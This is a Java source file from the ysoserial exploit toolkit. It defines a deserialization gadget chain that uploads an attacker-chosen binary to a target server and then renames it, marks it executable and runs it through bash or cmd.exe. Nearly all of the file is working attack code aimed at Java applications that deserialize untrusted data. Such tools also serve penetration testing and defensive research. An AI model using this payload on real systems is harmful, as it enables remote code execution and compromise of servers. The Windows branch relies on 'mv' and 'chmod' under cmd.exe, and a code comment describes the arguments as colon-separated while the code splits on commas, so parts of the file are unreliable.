package ysoserial.payloads;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.LinkedList;
import org.apache.commons.codec.binary.Base64;

import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

/**
 * This gadget allows an attacker to upload a binary and execute it
 * in one readObject() call. This is achieved by storing the binary
 * in a DiskFileItem and then leveraging one of the gadgets that
 * gives us access to getRuntime().exec(). The serialized gadget
 * is something like:
 * 
 * LinkedList:
 * 		[0] -> DiskFileItem
 * 		[1] -> Execution Gadget
 * 
 * This attack relies on wildcard expansion of "upload_*.tmp" only
 * being valid for one file. Note that, as far as I'm aware,
 * getRuntime().exec() does not work with wildcard expansion so we
 * have to explicitly call for the local shell that does (ie. cmd.exe
 * or /bin/bash).
 * 
 * This payload expects the "command" to be in the following format:
 * 	"uploaddir,file_path,os,gadgetname"
 * Where:
 * 	uploaddir: is the directory to upload to
 * 	file_path: is the path to the binary we want to upload
 * 	os: "linux" or "windows" to toggle between /bin/bash and cmd.exe
 * 	gadgetname: the executing gadget (ie CommonsCollections2)
 * 
 * For example:
 * 	"/tmp,/bin/ls,linux,CommonsCollections2"
 *  "C:\\\\Users\\\\Public,C:\Windows\System32\cmd.exe,windows,CommonsCollections2"
 * @author jbaines
 */
@PayloadTest(skip="Might not be a good idea.")
@SuppressWarnings({ "rawtypes" })
public class UploadAndExecute implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
	    // command should be split into "uploaddir:file_path:os:gadgetname"
        String[] commands = command.split(",");
        if (commands.length != 4) {
            throw new IllegalArgumentException("Unknown command format. Bad arg count.");
        }

        if (commands[3].equalsIgnoreCase("CommonsCollections1") ||
        	commands[3].equalsIgnoreCase("CommonsCollections5")) {
        	throw new IllegalArgumentException("This gadget doesn't currently support CC1 or CC5.");
        }

        // trim the path at the end if it was included
        if (commands[0].endsWith("/") || commands[0].endsWith("\\")) {
        	commands[0] = commands[0].substring(0, commands[0].length() - 1);
        }

        // Load the file into a string - FileUpload1 requires binary data to be base64 encoded
        File executable = new File(commands[1]);
        if (!executable.exists() || !executable.isFile()) {
        	throw new IOException("Invalid file: does not exist or isn't a file");
        }
        String executableData = Base64.encodeBase64String(Files.readAllBytes(Paths.get(executable.toURI())));

        // Generate the FileUpload1 gadget
        LinkedList<Object> upExecList = new LinkedList<Object>();
        final Class<? extends ObjectPayload> uploadClass = Utils.getPayloadClass("FileUpload1");
        final ObjectPayload uploadPayload = uploadClass.newInstance();
        upExecList.add(uploadPayload.getObject("writeB64," + commands[0] + "," + executableData));

	    // Our command will require wildcard expansion which requires /bin/bash or similar.
	    // So we will frame the command up in a new String[]. The command renames the uploaded
	    // file, sets the executable bit, and executes.
	    String execCommand = "new String[] {";
	    if (commands[2].equalsIgnoreCase("linux")) {
		    execCommand += "\"/bin/bash\", \"-c\", \"mv " + commands[0] +
		        "/upload_*.tmp " + commands[0] + "/exec.bin && chmod +x " +
			    commands[0] + "/exec.bin && " + commands[0] + "/exec.bin\" }";
	    } else if (commands[2].equalsIgnoreCase("windows")) {
		    execCommand += "\"cmd.exe\", \"/c\", " +
			    "\"cd " + commands[0] + " && mv upload_*.tmp exec.exe && chmod +x exec.exe && start exec.exe\" }";
	    } else {
		    throw new IllegalArgumentException("Unknown os provided.");
	    }

	    // Create the gadget that will execute our command
	    final Class<? extends ObjectPayload> execClass = Utils.getPayloadClass(commands[3]);
	    final ObjectPayload execPayload = execClass.newInstance();
	    upExecList.add(execPayload.getObject(execCommand));
	    return upExecList;
    }

    public static void main(final String[] args) throws Exception {
	    PayloadRunner.run(UploadAndExecute.class, args);
    }
}

